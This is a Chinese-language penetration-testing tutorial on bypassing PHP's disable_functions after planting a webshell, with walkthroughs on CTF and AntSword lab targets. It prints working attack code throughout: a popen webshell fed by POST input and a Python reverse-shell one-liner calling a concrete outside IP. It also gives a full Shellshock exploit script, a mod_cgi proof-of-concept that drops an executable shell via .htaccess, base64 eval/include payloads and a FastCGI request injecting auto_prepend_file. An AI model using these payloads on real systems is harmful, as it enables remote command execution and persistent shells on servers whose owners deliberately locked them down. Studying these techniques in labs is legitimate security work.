## ByPass-Disable_functions-姿势总结

# 0X01 Disable_Functions

为了安全起见，很多运维人员会禁用PHP的一些“危险”函数，例如eval、exec、system等，将其写在php.ini配置文件中，就是我们所说的disable_functions了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable_functions的设置中也通常较为严格。

如果在渗透时，上传了webshell却因为disable_functions禁用了我们函数而无法执行命令的话，这时候就需要想办法进行绕过，突破disable_functions。

![image-20210525144545854](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525144556.png)

# 0X02 常见绕过姿势

## 2.1 黑名单绕过

通过disable functions限制危险函数，也可能会有限制不全的情况。如果运维人员安全意识不强或对PHP不甚了解的话，则很有可能忽略某些危险函数，常见的有以下几种。

**exec()**

```php
<?php
echo exec('whoami');
?>
```

**shell_exec()**

```php
<?php
echo shell_exec('whoami');
?>
```

**system()**

```php
<?php
system('whoami');
?>
```

**passthru()**

```php
<?php
passthru("whoami");
?>
```

**popen()**

```php
<?php
$command=$_POST['cmd'];
$handle = popen($command,"r");
while(!feof($handle)){        
    echo fread($handle, 1024);  //fread($handle, 1024);
}  
pclose($handle);
?>
```

**proc_open()**

```php
<?php
$command="ipconfig";
$descriptorspec = array(1 => array("pipe", "w"));
$handle = proc_open($command ,$descriptorspec , $pipes);
while(!feof($pipes[1])){     
    echo fread($pipes[1], 1024); //fgets($pipes[1],1024);
}
?>
```

还有一个比较常见的易被忽略的函数就是pcntl_exec。

## 2.2 利用 pcntl_exec

**使用条件：**

PHP安装并启用了pcntl插件

pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。

`pcntl_exec()`是`pcntl`插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。

利用`pcntl_exec()`执行`test.sh`：

```php
<?php
if(function_exists('pcntl_exec')) {
   pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
       echo 'pcntl extension is not support!';
}
?>
```

由于`pcntl_exec()`执行命令是没有回显的，所以其常与python结合来反弹shell：

```php
<?php pcntl_exec("/usr/bin/python",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));
```

## 2.3 利用 LD_PRELOAD 环境变量

### 2.3.1 原理简述

`LD_PRELOAD`是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。

我们通过环境变量 `LD_PRELOAD` 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

想要利用`LD_PRELOAD`环境变量绕过`disable_functions`需要注意以下几点：

- 能够上传自己的.so文件
- 能够控制`LD_PRELOAD`环境变量的值，比如`putenv()`函数
- 因为新进程启动将加载`LD_PRELOAD`中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如`mail()`、`imap_mail()`、`mb_send_mail()`和`error_log()`函数等

一般而言，利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 c.so，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 `disable_functions` 限制执行操作系统命令的方式为：

- 编写一个原型为` uid_t getuid(void)`; 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 `getuid_shadow.so`；
- 运行 PHP 函数 `putenv()`（用来配置系统环境变量），设定环境变量` LD_PRELOAD` 为 `getuid_shadow.so`，以便后续启动新进程时优先加载该共享对象；
- 运行 PHP 的 `mail() `函数，`mail() `内部启动新进程` /usr/sbin/sendmail`，由于上一步 `LD_PRELOAD `的作用，`sendmail `调用的系统函数 `getuid() `被优先级更好的 `getuid_shadow.so` 中的同名 `getuid() `所劫持；
- 达到不调用 PHP 的 各种 命令执行函数（`system()、exec() `等等）仍可执行系统命令的目的。
- 之所以劫持 `getuid()`，是因为 `sendmail `程序会调用该函数（当然也可以为其他被调用的系统函数），在真实环境中，存在两方面问题：
  - 一是，某些环境中，web 禁止启用 `sendmail`、甚至系统上根本未安装 `sendmail`，也就谈不上劫持 `getuid()`，通常的 www-data 权限又不可能去更改 `php.ini` 配置、去安装 `sendmail `软件；
  - 二是，即便目标可以启用` sendmail`，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行` sendmail `都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。

基于这两个原因，yangyangwithgnu 大佬找到了一个方式，在加载时就执行代码（拦劫启动进程），而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了，[详情参见](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)

### 2.3.2 利用方法

下面，我们通过 [GKCTF2020]CheckIN 这道题来演示利用`LD_PRELOAD`来突破`disable_functions`的具体方法。

![image-20210525153009560](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153021.png)

构造如下拿到shell：

```
/?Ginkgo=ZXZhbCgkX1BPU1Rbd2hvYW1pXSk7
# 即eval($_POST[whoami]);
```

![image-20210525153126426](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153129.png)

但是无法执行命令：

![image-20210525153207354](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153213.png)

怀疑是设置了disable_functions，查看phpinfo：

```
/?Ginkgo=cGhwaW5mbygpOw==
# 即phpinfo();
```

发现确实设置了disable_functions：

![image-20210525153306230](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153307.png)

下面尝试绕过。

[需要去yangyangwithgnu 大佬的github上下载该项目的利用文件](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)

本项目中有这几个关键文件：

![image-20210525153355459](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153357.png)

- `bypass_disablefunc.php`：一个用来执行命令的 webshell。
- `bypass_disablefunc_x64.so`或`bypass_disablefunc_x86.so`：执行命令的共享对象文件，分为64位的和32位的。
- `bypass_disablefunc.c`：用来编译生成上面的共享对象文件。

对于`bypass_disablefunc.php`，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用`include`等函数来包含，并且需要用 GET 方法提供三个参数：

- cmd 参数：待执行的系统命令，如 id 命令。
- outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。
- sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。

首先，想办法将` bypass_disablefunc.php` 和` bypass_disablefunc_x64.so` 传到目标有权限的目录中：

![image-20210525153711013](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153712.png)

然后将`bypass_disablefunc.php`包含进来并使用GET方法提供所需的三个参数：

```http
/?Ginkgo=aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==&cmd=id&outpath=/tmp/outfile123&sopath=/var/tmp/bypass_disablefunc_x64.so
# include("/var/tmp/bypass_disablefunc.php");
```

如下所示，成功执行命令：

![image-20210525153835482](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153836.png)

成功执行/readflag并得到了flag：

![image-20210525153852110](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153854.png)

### 2.3.3 利用蚁剑中的`LD_PRELOAD`

在蚁剑中有该绕过`disable_functions`的插件：

![image-20210525153914001](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525153915.png)

我们选择 `LD_PRELOAD` 模式并点击开始按钮，成功后蚁剑会在 `/var/www/html` 目录里上传一个 `.antproxy.php` 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 `.antproxy.php`获得一个新的shell，在这个新shell里面就可以成功执行命令了。

## 2.4 利用 ShellShock（CVE-2014-6271）

### 2.4.1 使用条件

- Linux 操作系统
- `putenv()`、`mail()` 或 `error_log()` 函数可用
- 目标系统的 `/bin/bash` 存在 `CVE-2014-6271` 漏洞
- /bin/sh -> /bin/bash  sh 默认的 shell 是 bash

### 2.4.2 原理简述

该方法利用的bash中的一个老漏洞，即Bash Shellshock 破壳漏洞（CVE-2014-6271）。

该漏洞的原因是Bash使用的环境变量是通过函数名称来调用的，导致该漏洞出现是以 `(){` 开头定义的环境变量在命令 ENV 中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

一般函数体内的代码不会被执行，但破壳漏洞会错误的将"{}"花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。

### 2.4.3 利用方法

我们利用 AntSword-Labs 项目来搭建环境：

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/2
docker-compose up -d
```

搭建完成后访问 http://your-ip:18080，尝试使用system函数执行命令失败：

![image-20210525154439340](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154444.png)

查看phpinfo发现设置了disable_functions：

![image-20210525154518385](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154520.png)

我们使用蚁剑拿下shell：

![image-20210525154551503](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154553.png)

AntSword 虚拟终端中已经集成了对 ShellShock 的利用，直接在虚拟终端执行命令即可绕过disable_functions：

![image-20210525154626090](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154628.png)

也可以选择手动利用。在有权限的目录中（/var/tmp/exploit.php）上传以下利用脚本：

```php
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   error_log('a',1);
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

![image-20210525154712707](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154714.png)

然后包含该脚本并传参执行命令即可：

![image-20210525154728861](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154730.png)

如上图，成功执行命令

## 2.5 利用 Apache_Mod_CGI

### 2.5.1 使用条件

- Linux 操作系统
- Apache + PHP (apache 使用 apache_mod_php)
- Apache 开启了 `cgi`、`rewrite`
- Web 目录给了 `AllowOverride` 权限
- 当前目录可写

### 2.5.2 原理简述

早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。

当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。

而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。

任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。

Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：

```
Options +ExecCGI
AddHandler cgi-script .xxx
```

这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。

由于CGI程序可以执行命令，那我们可以利用CGI来执行系统命令绕过disable_functions。

### 2.5.3 利用方法

我们利用 AntSword-Labs 项目来搭建环境：

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/3
docker-compose up -d
```

搭建完成后访问 http://your-ip:18080：

![image-20210525155059472](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155101.png)

用蚁剑拿到shell后无法执行命令：

![image-20210525155130053](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155313.png)

执行phpinfo发现设置了disable_functions：

![image-20210525154518385](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525154520.png)

并且发现目标主机Apache开启了CGI，Web目录下有写入的权限。

我们首先在当前目录创建 .htaccess 文件，写入如下：

```
Options +ExecCGI
AddHandler cgi-script .ant
```

然后新建 shell.ant 文件，写入要执行的命令：

```
#!/bin/sh
echo Content-type: text/html
echo ""
echo&&id
```

**注意：**这里讲下一个小坑，linux中CGI比较严格，上传后可能会发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。

![image-20210525155434548](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155436.png)

此时我们的shell.xxx还不能执行，因为还没有权限，我们使用php的`chmod()`函数给其添加可执行权限：

![image-20210525155513465](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155515.png)

最后访问shell.ant文件便可成功执行命令：

![image-20210525155545250](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155634.png)

给出一个POC脚本：

```php
<?php
$cmd = "ls /"; //command to be executed
$shellfile = "#!/bin/bashn"; //using a shellscript
$shellfile .= "echo -ne "Content-Type: text/html\n\n"n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo "$text: " . ($condition ? $yes : $no) . "<br>n";
}
if (!isset($_GET['checked']))
{
    @file_put_contents('.htaccess', "nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
    $writable = is_writable('.'); //current dir writable?
    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
        checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
        checkEnabled("Is writable",$writable,"Yes","No");
        checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi && $writable && $htaccess))
    {
        echo "Error. All of the above must be true for the script to work!"; //abort if not
    }
    else
    {
        checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGInAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
        checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
        checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
        echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
    }
}
?>
```

### 2.5.4 利用蚁剑中的`Apache_Mod_CGI`

在蚁剑中有该绕过disable_functions的插件：

![image-20210525155853577](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525155940.png)

点击开始按钮后，成功之后会创建一个新的虚拟终端，在这个新的虚拟终端中即可执行命令了。

[[De1CTF2020]check in](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in) 这道题利用的便是这个思路，常见于文件上传中。

## 2.6 通过攻击 `PHP_FPM`

### 2.6.1 使用条件

- Linux 操作系统
- PHP-FPM
- 存在可写的目录，需要上传 `.so` 文件

### 2.6.2 原理简述

既然是利用PHP-FPM，我们首先需要了解一下什么是PHP-FPM，研究过apache或者nginx的人都知道，早期的Web服务器负责处理全部请求，其接收到请求，读取文件，然后传输过去。换句话说，早期的Web服务器只处理Html等静态Web资源。

但是随着技术发展，出现了像PHP等动态语言来丰富Web，形成动态Web资源，这时Web服务器就处理不了了，那就交给PHP解释器来处理吧！交给PHP解释器处理很好，但是，PHP解释器该如何与Web服务器进行通信呢？为了解决不同的语言解释器（如php、python解释器）与Web服务器的通信，于是出现了CGI协议。只要你按照CGI协议去编写程序，就能实现语言解释器与Web服务器的通信。如PHP-CGI程序。

其实，在上一节中我们已经了解了CGI以及Apache Mod CGI方面的知识了，下面我们再来继续补充一下。

#### 2.6.2.1 Fast-CGI

有了CGI，自然就解决了Web服务器与PHP解释器的通信问题，但是Web服务器有一个问题，就是它每收到一个请求，都会去Fork一个CGI进程，请求结束再kill掉这个进程，这样会很浪费资源。于是，便出现了CGI的改良版本——Fast-CGI。Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求（注意与另一个Apache_Mod_CGI区别）。这样就会大大的提高效率。

#### 2.6.2.2 Fast-CGI Record

CGI/Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

HTTP协议是**浏览器和服务器中间件**进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。

类比HTTP协议来说，CGI协议是**Web服务器和解释器**进行数据交换的协议，它由多条record组成，每一条record都和HTTP一样，也由header和body组成，Web服务器将这二者按照CGI规则封装好发送给解释器，解释器解码之后拿到具体数据进行操作，得到结果之后再次封装好返回给Web服务器。

和HTTP头不同，record的header头部固定的是8个字节，body是由头中的contentLength指定，其结构如下：

```php
typedef struct 
{
HEAD
    unsigned char version;              //版本
    unsigned char type;                 //类型
    unsigned char requestIdB1;          //id
    unsigned char requestIdB0;          
    unsigned char contentLengthB1;      //body大小
    unsigned char contentLengthB0;
    unsigned char paddingLength;        //额外大小
    unsigned char reserved;       
BODY
   unsigned char contentData[contentLength];//主要内容
   unsigned char paddingData[paddingLength];//额外内容
}FCGI_Record;
```

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record)

#### 2.6.2.3 PHP-FPM

前面说了那么多了，那PHP-FPM到底是个什么东西呢?

其实FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给谁呢? 其实就是发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。

举个例子，用户访问 `http://127.0.0.1/index.php?a=1&b=2` 时，如果web目录是`/var/www/html`，那么Nginx会将这个请求变成如下key-value对：

```
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

这个数组其实就是PHP中 `$_SERVER` 数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充 `$_SERVER` 数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到Fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行 `SCRIPT_FILENAME` 的值指向的PHP文件，也就是 `/var/www/html/index.php` 。

#### 2.6.2.4 如何攻击

这里由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和fpm进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 `disable_functions`的姿势。

因为前面我们了解了协议原理和内容，接下来就是使用CGI协议封装请求，通过Socket来直接与FPM通信。

但是能够构造Fastcgi，就能执行任意PHP代码吗？答案是肯定的，但是前提是我们需要突破几个限制。

- **第一个限制**

既然是请求，那么 `SCRIPT_FILENAME` 就相当的重要，因为前面说过，fpm是根据这个值来执行PHP文件文件的，如果不存在，会直接返回404，所以想要利用好这个漏洞，就得找到一个已经存在的PHP文件，好在一般进行源安装PHP的时候，服务器都会附带上一些PHP文件，如果说我们没有收集到目标Web目录的信息的话，可以试试这种办法.

- **第二个限制**

即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。那要如何绕过这种限制呢？我们可以从 `php.ini` 入手。它有两个特殊选项，能够让我们去做到任意命令执行，那就是 `auto_prepend_file` 和 `auto_append_file`。 `auto_prepend_file` 的功能是在执行目标文件之前，先包含它指定的文件。那么就有趣了，假设我们设置 `auto_prepend_file` 为`php://input`，那么就等于在执行任何PHP文件前都要包含一遍POST过去的内容。所以，我们只需要把待执行的代码放在POST Body中进行远程文件包含，这样就能做到任意代码执行了。

- **第三个限制**

我们虽然可以通过远程文件包含执行任意代码，但是远程文件包含是有 `allow_url_include` 这个限制因素的，如果没有为 `ON` 的话就没有办法进行远程文件包含，那要怎么设置呢? 这里，PHP-FPM有两个可以设置PHP配置项的KEY-VALUE，即 `PHP_VALUE` 和 `PHP_ADMIN_VALUE`，`PHP_VALUE` 可以用来设置php.ini，`PHP_ADMIN_VALUE` 则可以设置所有选项（disable_functions 选项除外），这样就解决问题了。

所以，我们最后最后构造的请求如下：

```
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/name.php',
    'SCRIPT_NAME': '/name.php',
    'QUERY_STRING': '?name=alex',
    'REQUEST_URI': '/name.php?name=alex',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '6666',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

该请求设置了 `auto_prepend_file = php://input` 且 `allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码了。

这里附上P神的EXP：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

### 2.6.3 利用方法

我们利用 AntSword-Labs 项目来搭建环境：

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/5
docker-compose up -d
```

搭建完成后访问 http://your-ip:18080：

![image-20210525160900401](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525160901.png)

拿下shell后发现无法执行命令：

![image-20210525160935247](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525160936.png)

查看phpinfo发现设置了disable_functions，并且，我们发现目标主机配置了FPM/Fastcgi：

![image-20210525161031405](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161032.png)

我们便可以通过PHP-FPM绕过disable_functions来执行命令。

### 2.6.4 利用蚁剑中的`Fastcgi/PHP_FPM`

在蚁剑中有该通过PHP-FPM模式绕过disable_functions的插件：

![image-20210525161144337](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161147.png)

注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，默认的是 `unix:///` 本地 Socket 这种的，如果配置成 TCP 的默认是 `127.0.0.1:9000`。

我们本例中PHP-FPM 的接口地址，发现是 `127.0.0.1:9000`：

![image-20210525161235439](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161237.png)

所以在此处选择 `127.0.0.1:9000`：

![image-20210525161256802](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161258.png)

点击开始按钮：

![image-20210525161321134](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161322.png)

成功后蚁剑会在 `/var/www/html` 目录上传一个 `.antproxy.php` 文件。我们创建副本，并将连接的 URL shell 脚本名字改为 `.antproxy.php` 来获得新的shell：

![image-20210525161351217](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161352.png)

在新的shell里面就可以成功执行命令了：

![image-20210525161427528](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161525.png)

## 2.7 利用 `PHP_GC_UAF`

### 2.7.1 使用条件

1. Linux 操作系统

2. PHP 版本

   7.0 - all versions to date

   7.1 - all versions to date

   7.2 - all versions to date

   7.3 - all versions to date

### 2.7.2 原理简述

此漏洞利用PHP垃圾收集器中存在三年的一个 bug ，通过PHP垃圾收集器中堆溢出来绕过 `disable_functions` 并执行系统命令。

利用脚本：https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass

### 2.7.3 利用方法

下面，我们还是通过 [GKCTF2020]CheckIN 这道题来演示利用GC UAF来突破disable_functions的具体方法。

此时我们已经拿到了shell：

![image-20210525161845302](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161936.png)

需要下载利用脚本：https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass

下载后，在pwn函数中放置你想要执行的系统命令：

![image-20210525161905871](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525161943.png)

这样，每当你想要执行一个命令就要修改一次pwn函数里的内容，比较麻烦，所以我们可以直接该为POST传参：

![image-20210525162031566](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525162033.png)

这样就方便多了。

将修改后的利用脚本exploit.php上传到目标主机有权限的目录中：

![image-20210525162054562](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525162055.png)

然后将exploit.php包含进来并使用POST方法提供你想要执行的命令即可：

```
/?Ginkgo=aW5jbHVkZSgiL3Zhci90bXAvZXhwbG9pdC5waHAiKTs=
# include("/var/tmp/exploit.php");
POST: whoami=ls /
```

如下图所示，成功执行命令：

